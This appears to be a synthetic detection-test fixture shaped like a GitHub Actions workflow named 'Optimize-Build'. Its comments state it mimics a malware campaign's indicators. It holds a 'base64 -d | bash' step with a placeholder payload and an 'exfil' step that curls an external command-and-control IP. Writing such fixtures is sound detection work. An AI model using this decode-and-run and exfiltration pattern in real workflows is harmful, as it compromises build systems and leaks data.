# Synthetic positive fixture — Megalodon_High_Confidence (multiple corroborating IoCs)
# Contains: C2 IP + Optimize-Build name + base64 | bash pattern — the full targeted variant signature.
# The base64 string is a benign placeholder of sufficient length (40+ chars) for regex matching.
# The decoded content would be "synthetic yara test fixture placeholder" — not a real payload.
# This is a text file only — not a functional workflow; cannot execute anything.
name: Optimize-Build
on:
  workflow_dispatch:
jobs:
  build:
    runs-on: ubuntu-latest
    steps:
      - name: run
        run: echo c3ludGhldGljIHlhcmEgdGVzdCBmaXh0dXJlIHBsYWNlaG9sZGVyCg== | base64 -d | bash
      - name: exfil
        run: curl -s http://216.126.225.129:8443/out
